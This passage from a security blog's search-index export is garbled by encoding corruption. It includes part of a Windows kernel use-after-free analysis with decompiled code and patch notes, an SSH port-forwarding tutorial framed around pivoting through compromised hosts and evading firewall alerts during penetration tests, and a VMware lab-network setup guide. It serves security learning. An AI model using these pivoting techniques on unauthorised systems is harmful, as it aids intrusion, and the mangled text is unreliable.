DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v25, a1); // åˆ©ç”¨æ„é€ å‡½æ•°ä»HDCåˆ›å»ºDCOBJå¯¹è±¡ v8 = v25; Â·Â·Â·Â·Â·Â·Â·Â·Â·Â· v10 = *(_QWORD *)(v8 + 48);\t// èµ‹å€¼ *(_QWORD *)(v10 + 1736) = 0i64; v24 = v11; Â·Â·Â·Â·Â·Â·Â· v9 = *(_QWORD *)(v25 + 512) != 0i64; v12 = *(_DWORD *)(v25 + 120) \u0026gt; 0; Â·Â·Â·Â·Â·Â·Â· v13 = (HDC)hdcOpenDCW(\u0026amp;qword_1C0141EB0, v26, 0i64, 0i64, *(_QWORD *)(v10 + 2584));// åˆ›å»ºæ–°çš„DCå¯¹è±¡ï¼Œè¿”å›å¯¹åº”çš„HDCå¥æŸ„ if ( v13 ) { *(_QWORD *)(v10 + 2584) = 0i64; DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v24, v13); v14 = (_QWORD *)v24; if ( v24 ) { if ( v12 ) *(_DWORD *)(v24 + 120) = *(_DWORD *)(v24 + 116); v14[308] = *(_QWORD *)(v25 + 2464); *(_QWORD *)(v25 + 2464) = 0i64; v14[309] = *(_QWORD *)(v25 + 2472); *(_QWORD *)(v25 + 2472) = 0i64; v15 = *(void (__fastcall **)(_QWORD, _QWORD))(v10 + 2768); if ( v15 ) v15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64));// è°ƒç”¨å‡½æ•°æŒ‡é’ˆæŒ‡å‘çš„å‡½æ•°ï¼Œä¼ å…¥å‚æ•°ä¸ºç”¨æˆ·ä¼ å…¥çš„HDCå¯¹åº”çš„DCå¯¹è±¡å†…çš„å€¼ Â·Â·Â·Â·Â·Â·Â· HmgSwapLockedHandleContents(v3, 0i64, v6, 0i64, v23);// äº¤æ¢æ—§çš„å’Œæ–°çš„HDCå¯¹è±¡ GreReleaseHmgrSemaphore(); Â·Â·Â·Â·Â·Â· bDeleteDCInternal(v6, 1i64, 0i64); // åˆ é™¤äº†hdcOpenDCWåˆ†é…çš„HDCï¼Œä½†å‰é¢ç»è¿‡HmgSwapLockedHandleContentsäº¤æ¢äº†å¥æŸ„ï¼Œå®é™…åˆ é™¤çš„æ˜¯æ—§çš„HDC Â·Â·Â·Â·Â·Â· åœ¨è¡¥ä¸ä¸­ï¼Œå¢åŠ äº†å¯¹DCå¯¹è±¡å¼•ç”¨æ¬¡æ•°è¿›è¡Œåˆ¤æ–­çš„é€»è¾‘ï¼Œå¦‚æœåœ¨GreResetDCInternalå‡½æ•°ä¸­DCå¯¹è±¡å¼•ç”¨æ¬¡æ•°å¤§äº1åˆ™è¡¨æ˜å·²ç»å‘ç”Ÿå¼‚å¸¸ï¼Œè¿›å…¥å¼‚å¸¸é€»è¾‘æŠ›å‡ºé”™è¯¯(å› ä¸ºæŒ‰æ­£å¸¸æµç¨‹æ­¤å¤„DCå¯¹è±¡å¼•ç”¨æ¬¡æ•°åº”ä¸ºä¸åº”è¯¥å¤§äº1)ã€‚\n__int64 __fastcall sub_1C014CB0C(__int64 a1, __int64 a2, int *a3) { ...... int *v30; // [rsp+30h] [rbp-1h] ..... v9 = (__int64)v30; if ( !v30 ) { LABEL_6: EngSetLastError(6i64); LABEL_7: v13 = (__int64)v30; goto LABEL_8; } if ( *((_WORD *)v30 + 6) \u0026gt; 1u ) { if ( *(_DWORD *)\u0026amp;stru_1C032C3F8.Length \u0026gt; 5u \u0026amp;\u0026amp; (unsigned __int8)sub_1C00B5068(\u0026amp;stru_1C032C3F8, 0x400000000000i64) ) { v31 = \u0026amp;v25; v30 = \u0026amp;v26; v29 = \u0026amp;v28; v28 = 0x1000000i64; SysEntryGetDispatchTableValues(v10, (__int64)\u0026amp;unk_1C02F466B, v11, v12); } goto LABEL_6; } å‚è€ƒé“¾æ¥ï¼š\nhttps://www.secrss.com/articles/35266\nhttps://mp.weixin.qq.com/s/AcFS0Yn9SDuYxFnzbBqhkQ\nhttps://bbs.pediy.com/thread-269930.htm\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/application-layer/ssh-tunnel/","title":"SSHéš§é“","tags":[],"description":"","content":"SSHéš§é“ SSHæä¾›äº†ä¸‰ç§è½¬å‘æ¨¡å¼ï¼šæœ¬åœ°ç«¯å£è½¬å‘ã€è¿œç¨‹ç«¯å£è½¬å‘ä»¥åŠåŠ¨æ€ç«¯å£è½¬å‘ï¼Œæœ¬æ–‡å°†ä»‹ç»è¿™ä¸‰ç§è½¬å‘æ¨¡å¼çš„ç”¨æ³•ã€‚\nä¸€äº›åŸºæœ¬æ¦‚å¿µ æœ¬åœ°ä¸»æœºï¼šSSHå®¢æˆ·ç«¯æ‰€åœ¨çš„ä¸»æœºã€‚\nè¿œç¨‹ä¸»æœºï¼šç›¸å¯¹äºæœ¬åœ°ä¸»æœºçš„æ¦‚å¿µï¼Œåœ¨æœ¬åœ°ä¸»æœºä¹‹å¤–çš„ä¸»æœºå«è¿œç¨‹ä¸»æœºã€‚\nSSHå‘½ä»¤è¡Œå‚æ•°è§£é‡Š\n-C:å‹ç¼©ä¼ è¾“ï¼Œæé«˜ä¼ è¾“é€Ÿåº¦ -f:å°†sshè½¬å…¥åå°æ‰§è¡Œ -N:å»ºç«‹é™é»˜è¿æ¥ï¼ˆè¿æ¥åçœ‹ä¸åˆ°å…·ä½“ä¼šè¯ï¼‰ -g:å…è®¸è¿œç¨‹ä¸»æœºè¿æ¥æœ¬åœ°ç”¨äºè½¬å‘çš„ç«¯å£ -L:æœ¬åœ°ç«¯å£è½¬å‘ -R:è¿œç¨‹ç«¯å£è½¬å‘ æœ¬åœ°ç«¯å£è½¬å‘ æœ¬åœ°ç«¯å£è½¬å‘ï¼Œå³å°†æœ¬åœ°ç«¯å£è½¬å‘åˆ°è¿œç¨‹ä¸»æœºä¸Šï¼Œå‘½ä»¤æ ¼å¼ï¼šssh -L \u0026lt;local port\u0026gt;:\u0026lt;remote host\u0026gt;:\u0026lt;remote port\u0026gt; \u0026lt;username\u0026gt;@\u0026lt;SSH hostname\u0026gt;\nä¸¾ä¾‹ï¼š\nSSH Client IP:x.x.x.x SSH Server IP:a.b.c.d åœ¨SSH Clientè¿è¡Œå‘½ä»¤ssh -CfNg -L 127.0.0.1:1313:127.0.0.1:1313 root@a.b.c.d ï¼Œå°†127.0.0.1:1313ç«¯å£è½¬å‘åˆ°SSH Serverçš„127.0.0.1:1313ç«¯å£ä¸Šã€‚æ­¤æ—¶SSH Clientè®¿é—®127.0.0.1:1313çš„ç»“æœè·Ÿè®¿é—®åœ¨SSH Serverç«¯çš„127.0.0.1:1313ç»“æœä¸€æ ·ã€‚\nåœ¨SSH Clientä¸Š\næ­¤æ—¶åœ¨SSH Clientä¸Šçš„sshä¼šç›‘å¬127.0.0.1:1313è¿™ä¸ªç«¯å£ï¼Œè¯¥ç«¯å£çš„TCPæ•°æ®é€šè¿‡sshéš§é“ä¼ è¾“åˆ°SSH serverä¸Šã€‚\nåœ¨SSH Serverä¸Šï¼Œå…ˆç›‘å¬127.0.0.1:1313ç«¯å£ï¼Œæœ¬æ–‡ç›‘å¬ä½¿ç”¨hugo å¯åŠ¨ä¸€ä¸ªserverã€‚\nåœ¨SSH Clientä¸Šä½¿ç”¨curl 127.0.0.1:1313å‘½ä»¤æ—¶è¿”å›çš„å†…å®¹å³ä¸ºSSH Serverä¸Š127.0.0.1:1313çš„å†…å®¹\nåŒæ—¶æœ¬åœ°ç«¯å£è½¬å‘å‘½ä»¤ä¸­remote ipä¸æ­¢é™åˆ¶åœ¨127.0.0.1ä¸Šï¼Œremote ipå¯ä»¥æ˜¯ä»»ä½•ä¸€ä¸ªSSH Serverèƒ½å¤Ÿè¿æ¥çš„hostï¼Œå®é™…ä¸Šæœ¬åœ°ç«¯å£è½¬å‘è¿‡ç¨‹ä¸­ï¼Œå®é™…ä¸Šæ˜¯æŠŠSSH Serverå½“ä½œè·³æ¿æœºï¼Œè¿é€šSSH Clientå’ŒSSH Serverå¦å¤–ä¸€ç«¯çš„ä¸»æœºï¼Œå¦‚ä¸‹ï¼š\n|SSH Client| \u0026lt;-------------\u0026gt;|SSH Server| \u0026lt;--------------\u0026gt;|SSH Clientä¸èƒ½è®¿é—®ä½†æ˜¯SSH Serverèƒ½è®¿é—®çš„ä¸»æœº|\næœ¬åœ°ç«¯å£è½¬å‘ä¸€èˆ¬åº”ç”¨åœºæ™¯ä¸ºåœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­æ§åˆ¶äº†ç›®æ ‡ç½‘ç»œä¸­å¸¦æœ‰SSH Serverçš„ä¸€å°æœºå™¨ï¼Œé€šè¿‡è¿™å°æœºå™¨åšä¸ºè·³æ¿æœºæ¥è®¿é—®å†…ç½‘å…¶ä»–ä¸»æœºä¸Šçš„æœåŠ¡ã€‚ä¸€å®šç¨‹åº¦ä¸Šè§„é¿é˜²ç«å¢™çš„æµé‡å‘Šè­¦ï¼ˆå› ä¸ºsshæµé‡ä¸ºåŠ å¯†æµé‡ï¼‰\nè¿œç¨‹ç«¯å£è½¬å‘ã€‚ è¿œç¨‹ç«¯å£è½¬å‘å³å’Œæœ¬åœ°ç«¯å£è½¬å‘æ˜¯ç›¸åçš„æ¦‚å¿µï¼Œæœ¬åœ°ç«¯å£è½¬å‘æ˜¯å°†æœ¬åœ°ç«¯å£è½¬å‘åˆ°è¿œç¨‹ç«¯å£ä¸Šï¼Œè¿æ¥æœ¬åœ°ç«¯å£å³è·Ÿè¿æ¥è¿œç¨‹ç«¯å£ä¸€ä¸ªæ•ˆæœã€‚è€Œè¿œç¨‹ç«¯å£è½¬å‘å³å°†è¿œç¨‹ç«¯å£è½¬å‘åˆ°æœ¬åœ°ï¼Œä½¿å¾—è¿æ¥è¿œç¨‹ç«¯å£å³è·Ÿè¿æ¥æœ¬åœ°ç«¯å£ä¸€æ ·ã€‚å‘½ä»¤æ ¼å¼ï¼šssh -R \u0026lt;remote port\u0026gt;:\u0026lt;local ip\u0026gt;:\u0026lt;local port\u0026gt; \u0026lt;username\u0026gt;@\u0026lt;SSH hostname\u0026gt;\nä¸¾ä¾‹ï¼š\nSSH Client IP:x.x.x.x SSH Server IP:a.b.c.d æœ¬æ¬¡æˆ‘ä»¬å°†SSH Clientçš„3389ç«¯å£è½¬å‘åˆ°SSH Serverï¼ˆå…¬ç½‘æœåŠ¡å™¨ï¼‰ä¸Šï¼Œä½¿å¾—å¦å¤–ä¸€å°æœºå™¨èƒ½å¤Ÿé€šè¿‡SSH Serverçš„ç«¯å£è¿æ¥åˆ°ä½äºå±€åŸŸç½‘çš„SSH Clientçš„è¿œç¨‹æ¡Œé¢ã€‚\nåœ¨ssh clientä¸Šè¿è¡Œå‘½ä»¤\næ­¤æ—¶ä»»ä½•è¿æ¥SSH Server:9898çš„è¯·æ±‚éƒ½ä¼šè¢«è½¬å‘åˆ°SSH Clientçš„58989ç«¯å£ä¸Šï¼Œè¯¥ç«¯å£ç›‘å¬çš„æœåŠ¡ä¸ºè¿œç¨‹æ¡Œé¢æœåŠ¡ã€‚åœ¨å¦å¤–ä¸€å°ç”µè„‘ï¼ˆä¸åŒäºSSH Serverå’ŒSSH Clientï¼‰ä½¿ç”¨è¿œç¨‹æ¡Œé¢è¿æ¥SSH Server:9898\nåŒæœ¬åœ°ç«¯å£è½¬å‘ä¸€æ ·ï¼Œè¿œç¨‹ç«¯å£è½¬å‘å‘½ä»¤ä¸­çš„local ipå¯ä»¥æ˜¯ä»»ä½•ä¸€ä¸ªSSH Clientèƒ½å¤Ÿè¿æ¥çš„hostï¼Œæ­¤æ—¶SSH Clientè¢«å½“ä½œè·³æ¿æœºï¼Œè¿é€šSSH Clientå¦å¤–ä¸€ç«¯å’ŒSSH Serverç«¯çš„ä¸»æœºã€‚\n|SSH Serveèƒ½å¤Ÿè¿é€šçš„ä¸»æœº| \u0026lt;--------------\u0026gt; |SSH Client| \u0026lt;--------------\u0026gt; |SSH Clientèƒ½è®¿é—®ä½†æ˜¯SSH Serverä¸èƒ½è®¿é—®çš„ä¸»æœº|\nè¿œç¨‹ç«¯å£è½¬å‘åº”ç”¨åœºæ™¯ä¸€èˆ¬æ˜¯å°†å±€åŸŸç½‘çš„æŸäº›æœåŠ¡é€šè¿‡SSHéš§é“æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼Œæˆ–è€…åœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œæ§åˆ¶äº†å†…ç½‘çš„æŸå°ä¸»æœºï¼Œé€šè¿‡è¿œç¨‹ç«¯å£è½¬å‘ï¼Œå°†è¯¥ä¸»æœºä½œä¸ºè·³æ¿æœºæ¥è®¿é—®å†…ç½‘å…¶ä»–æœåŠ¡ï¼Œå› ä¸ºæ­¤æ—¶SSHæ˜¯ä»å†…ç½‘è¿æ¥åˆ°å¤–ç½‘ï¼Œåœ¨æµé‡ä¸Šæ²¡æœ‰é‚£ä¹ˆå¯ç–‘ã€‚\nåŠ¨æ€ç«¯å£è½¬å‘ åœ¨æœ¬åœ°ç«¯å£è½¬å‘å’Œè¿œç¨‹ç«¯å£è½¬å‘è¿‡ç¨‹ä¸­ï¼Œä¸€æ¬¡æ€§åªèƒ½è½¬å‘ä¸€ä¸ªç«¯å£ï¼Œåœ¨æŸäº›åœºæ™¯ä¸‹æ•ˆç‡å¤ªä½äº†ï¼Œè€ŒåŠ¨æ€ç«¯å£è½¬å‘æ²¡æœ‰æŒ‡å®šç›®çš„ç«¯å£ï¼Œç›¸å¯¹äºå‰ä¸¤ç§æ¥è¯´æ›´çµæ´»ã€‚å®é™…ä¸ŠåŠ¨æ€ç«¯å£è½¬å‘å³ä¸ºSSHå®ç°çš„SOCKSåè®®ã€‚å‘½ä»¤æ ¼å¼:ssh -D port \u0026lt;username\u0026gt;@\u0026lt;SSH host\u0026gt;ã€‚\nåœ¨SSH Clientæ‰§è¡Œå‘½ä»¤å³å¯åœ¨SSH Clientå’ŒSSH Serverä¹‹é—´å»ºç«‹socks5éš§é“ï¼ŒSSH Clientå¯ä»¥è¿æ¥è¯¥éš§é“æ¥ä¼ è¾“æ•°æ®ã€‚\nç»„åˆåˆ©ç”¨ åœ¨ä¸€äº›æƒ…å†µä¸‹å¯ä»¥é€šè¿‡ç»„åˆä¸Šé¢ä¸‰ç§è½¬å‘æ¥è¾¾åˆ°æ„æƒ³ä¸åˆ°çš„æ•ˆæœã€‚\nä¾‹å¦‚ï¼Œæœ‰ä¸¤å°ä½äºäº’ä¸ç›¸é€šçš„å±€åŸŸç½‘ä¸»æœºï¼Œå¦‚æœä¸€å°æƒ³è¦è®¿é—®å¦å¤–ä¸€å°èƒ½å¤Ÿè®¿é—®çš„æœåŠ¡æ—¶ï¼Œå¯ä»¥ä»¥ä¸‹é¢çš„æ–¹å¼è¾¾åˆ°ç›®çš„\nåœ¨ä¸»æœº1ä¸Šæ‰§è¡Œå‘½ä»¤ ssh -CfNg -R 9898:192.168.50.1:22 root\u0026lt;SSH Server\u0026gt; å°†ä¸»æœº1çš„sshç«¯å£è½¬å‘åˆ°å…¬ç½‘æœåŠ¡å™¨çš„9898ç«¯å£ã€‚\nåœ¨ä¸»æœº2æ‰§è¡Œå‘½ä»¤ssh -D 12222 -p 9898 \u0026lt;username\u0026gt;@\u0026lt;SSH Server\u0026gt; æ­¤æ—¶sshè¿æ¥çš„æ˜¯ä¸»æœº1ï¼Œä¸”å»ºç«‹äº†sockséš§é“ï¼Œé€šè¿‡è¯¥éš§é“ä¸»æœº2å¯ä»¥æ–¹ä¾¿çš„ä½¿ç”¨ä¸»æœº1èƒ½è®¿é—®è€Œä¸»æœº2ä¸èƒ½ç›´æ¥è®¿é—®çš„æœåŠ¡ã€‚\n"},{"uri":"https://www.ch35tnut.site/zh-cn/others/vmware-based-implementation-of-small-domain-network-construction/","title":"åŸºäºVmwareçš„å°å‹åŸŸç½‘ç»œæ­å»º","tags":[],"description":"","content":"åŸºäºVmwareçš„å°å‹åŸŸç½‘ç»œæ­å»º æ‘˜è¦ åœ¨æ¸—é€çš„æ—¥å¸¸å­¦ä¹ è¿‡ç¨‹ä¸­ç»å¸¸éœ€è¦ä¸€ä¸ªå†…ç½‘ç¯å¢ƒï¼Œæœ¬ç¯‡æ–‡ç« ä»‹ç»å¦‚ä½•ä½¿ç”¨Vmwareå’ŒMikroTikæ­å»ºç®€æ˜“çš„äºŒå±‚å†…ç½‘ç¯å¢ƒã€‚\nç½‘ç»œç»“æ„ æ•´ä¸ªç½‘ç»œåˆ†ä¸ºç»“æ„åˆ†ä¸ºä¸‰å±‚ï¼Œç¬¬ä¸€å±‚æ¨¡æ‹Ÿå¤–ç½‘ç¯å¢ƒï¼Œç¬¬äºŒå±‚ä¸ºDMZåŒºåŸŸï¼Œè¯¥åŒºåŸŸé€šè¿‡è¾¹ç•Œè·¯ç”±å™¨çš„ç«¯å£æ˜ å°„ï¼Œå°†ç¬¬äºŒå±‚ç½‘ç»œä¸»æœºçš„ä¸€äº›ç«¯å£æ˜ å°„åˆ°è¾¹ç•Œè·¯ç”±å™¨ä¸Šå¯¹å¤–æä¾›æœåŠ¡ï¼Œç¬¬ä¸‰å±‚æ¨¡æ‹ŸåŠå…¬ç½‘ï¼Œè¯¥å±‚ç½‘ç»œä¸ºåŸŸç½‘ç»œï¼ŒåŒæ—¶å¯ä»¥æ§åˆ¶ç¬¬äºŒå±‚ç½‘ç»œçš„ä¸»æœºã€‚\næ•´ä¸ªç½‘ç»œæ‹“æ‰‘å›¾å¦‚ä¸‹ï¼š\nIPè®¾ç½®ï¼š\nç¬¬ä¸€å±‚ç½‘ç»œä¸ºï¼ˆå¤–ç½‘ï¼‰ï¼š192.168.59.0/24\nç¬¬äºŒå±‚ç½‘ç»œä¸ºï¼ˆDMZåŒºåŸŸï¼‰ï¼š192.168.72.0/24\nç¬¬ä¸‰å±‚ç½‘ç»œä¸ºï¼ˆåŠå…¬ç½‘ï¼‰ï¼š172.16.2.0/24\nè·¯ç”±å™¨IPåœ°å€ï¼š\nè¾¹ç•Œè·¯ç”±å™¨ï¼š192.168.59.141 | 192.168.72.2\nå†…ç½‘è·¯ç”±å™¨ï¼š192.168.72.254 | 172.16.2.254\nç½‘ç»œæ­å»º ç½‘ç»œè®¾ç½® é¦–å…ˆä½¿ç”¨VMwareçš„è™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨å¢åŠ ä¸¤ä¸ªç½‘ç»œVMnet2ã€VMnet3ï¼Œéƒ½å‹¾é€‰ä»…ä¸»æœºæ¨¡å¼ï¼ŒåŒæ—¶å–æ¶ˆä¸‹é¢ä¸¤ä¸ªå‹¾ï¼Œå¦‚ä¸‹å›¾ï¼š\nVMnet3åŒç†ï¼ŒåŒæ—¶åœ¨DHCPè®¾ç½®å¤„è®¾ç½®ç›¸åº”çš„IPåœ°å€å’Œæ©ç ã€‚å…¶ä¸­å¤–å±‚ç½‘ç»œä¸ºnatæ¨¡å¼ï¼ŒVMnet2ä¸ºDMZåŒºåŸŸç½‘ç»œï¼ŒVMnet3ä¸ºåŠå…¬ç½‘ç»œ\nè™šæ‹Ÿæœºæ­å»º æ•´ä¸ªç½‘ç»œåœ¨æœ€å°‘æƒ…å†µä¸‹ä¸€å…±éœ€è¦å…­å°è™šæ‹Ÿæœºï¼Œåˆ†ä¸ºä¸¤å°ROSï¼Œå››å°ç½‘ç»œä¸­çš„ä¸»æœºã€‚\nROSä»hxxps://mikrotik.com/downloadä¸‹è½½stableç‰ˆæœ¬çš„ovaæ ¼å¼çš„é•œåƒï¼Œä¹‹åå¯¼å…¥åˆ°VMwareä¸­ã€‚ä¸€å…±éœ€è¦å¯¼å…¥ä¸¤æ¬¡ï¼Œåˆ†åˆ«å‘½åä¸ºROSï¼ŒROS-1ã€‚é™¤äº†ä¸‹è½½é•œåƒä¹‹å¤–è¿˜éœ€è¦ä¸‹è½½winboxæ–¹ä¾¿å¯¹è·¯ç”±å™¨è¿›è¡Œè®¾ç½®ã€‚\nç½‘ç»œä¸­ä¸»æœºåˆ†å¸ƒï¼š\nDMZï¼šUbuntu 2004ã€windows7\nåŠå…¬ç½‘ï¼šWindows server2019ã€windows7\nåˆ›å»ºä¸Šè¿°è™šæ‹Ÿæœºï¼Œå¹¶å°†DMZåŒºåŸŸçš„ä¸»æœºçš„ç½‘å¡è®¾ç½®ä¸ºVMnet2ï¼ŒåŠå…¬ç½‘çš„ä¸»æœºè®¾ç½®ä¸ºVMnet3.\nå°†è¾¹ç•Œè·¯ç”±å™¨ROSç½‘å¡è®¾ç½®ä¸ºnetæ¨¡å¼å’ŒVMnet2æ¨¡å¼ï¼Œå†…ç½‘è·¯ç”±å™¨è®¾ç½®ä¸ºVMnet2å’ŒVMnet3æ¨¡å¼ã€‚\nIPåœ°å€åŠè·¯ç”±å™¨è®¾ç½® ç»å†ä¸Šé¢çš„æ­¥éª¤ä¹‹åï¼ŒåŸºæœ¬çš„ç½‘ç»œæ‹“æ‰‘å·²ç»æ­å»ºå®Œæˆï¼Œæ¥ä¸‹æ¥éœ€è¦å¯¹ç½‘ç»œå†…çš„ä¸»æœºå’Œè·¯ç”±å™¨è¿›è¡Œè®¾ç½®ä½¿å¾—ç½‘ç»œä¸­çš„ä¸»æœºèƒ½å¤Ÿç›¸äº’pingé€šã€‚\né¦–å…ˆè®¾ç½®ä¸¤ä¸ªç½‘ç»œä¸­çš„ä¸»æœºIPåœ°å€\nDMZï¼š\nWindows7ï¼š192.168.72.4/24 ç½‘å…³192.168.72.2 DNS114.114.114.114\nUbuntu ï¼š192.168.72.3/24 ç½‘å…³192.168.72.2 DNS114.\n114.114.114\nåŠå…¬ç½‘ï¼š\nWindows server 2019ï¼š172.16.2.4/24 ç½‘å…³172.16. 2.254 DNS127.0.0.1\nwindows7ï¼š172.16.2.3/24 ç½‘å…³172.16.2.254 DNS172.16.2.4\nè‡³æ­¤ï¼Œä¸¤ä¸ªç½‘ç»œçš„ä¸»æœºåº”è¯¥å¯ä»¥pingé€šåŒä¸€ä¸ªç½‘ç»œçš„ä¸»æœºã€‚æ¥ä¸‹æ¥è®¾ç½®ä¸¤ä¸ªROSçš„IPåœ°å€ã€‚\næ‰“å¼€winboxï¼Œç‚¹å‡»NeighborsæŒ‰é’®ï¼Œä¼šè‡ªåŠ¨å—…æ¢ç½‘ç»œå†…çš„å­˜æ´»çš„è·¯ç”±å™¨ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚\nä¸Šå›¾ä¸ºè¾¹ç•Œè·¯ç”±å™¨çš„IPåœ°å€ï¼Œå¦‚æœåˆ†é…äº†IPåœ°å€åˆ™å¯ä»¥åœ¨æµè§ˆå™¨é€šè¿‡IPåœ°å€æµè§ˆè·¯ç”±å™¨çš„webç•Œé¢ï¼Œåœ¨å¦‚æœæ²¡æœ‰åˆ†é…IPåœ°å€åˆ™é€šè¿‡wibboxä½¿ç”¨MACåœ°å€ç™»å½•\nè¿›å…¥ä¹‹åï¼Œåœ¨å·¦ä¾§é€‰é¡¹å¡ä¼šåˆ—å‡ºè·¯ç”±å™¨æ‹¥æœ‰çš„æ‰€æœ‰ç½‘å¡æ¥å£ï¼Œç‚¹å‡»ä¹‹åè¿›å…¥åˆ°æ¥å£è¯¦æƒ…ç•Œé¢ï¼Œåœ¨é‡Œé¢ä¼šåˆ—å‡ºè¯¥æ¥å£çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡ç½‘å¡çš„MACåˆ†è¾¨è¯¥ç½‘å¡å¯¹åº”åœ¨vmwareä¸­çš„ç½‘å¡ï¼Œå°†ä¸¤ä¸ªç½‘å¡åç§°åˆ†åˆ«è®¾ç½®ä¸ºether1-wanå’Œether2-lanï¼Œä¹‹ååœ¨ip-\u0026gt;addressesé€‰é¡¹å¡ä¸­å°†ether-lanè®¾ç½®ä¸ºä¸‹å›¾ã€‚ether1-wanä¸ç”¨è®¾ç½®ï¼Œå› ä¸ºè¯¥ç½‘å¡ç½‘ç»œç±»å‹ä¸ºnatä¼šè‡ªåŠ¨dhcpåˆ†é…\nä¹‹ååœ¨IP-\u0026gt;Firewall-\u0026gt;NATä¸­æ–°å»ºè§„åˆ™ï¼Œchainï¼šsrcnatï¼Œout.interface:ether2-lan,action:masquerade\nè¯¥è§„åˆ™å°†ä½¿å¾—è·¯ç”±å™¨ä¸¤è¾¹çš„ç½‘ç»œè”é€šã€‚\nå‚è€ƒ\nhttps://www.huaweicloud.com/articles/401014315f14d0fb8d5e3f5489693621.html http://www.roszj.com/1692.html http://www.irouteros.com/?p=583\n"},{"uri":"https://www.ch35tnut.site/zh-cn/categories/","title":"Categories","tags":[],"description":"","content":""},{"uri":"https://www.ch35tnut.site/zh-cn/tags/","title":"Tags","tags":[],"description":"","content":""}]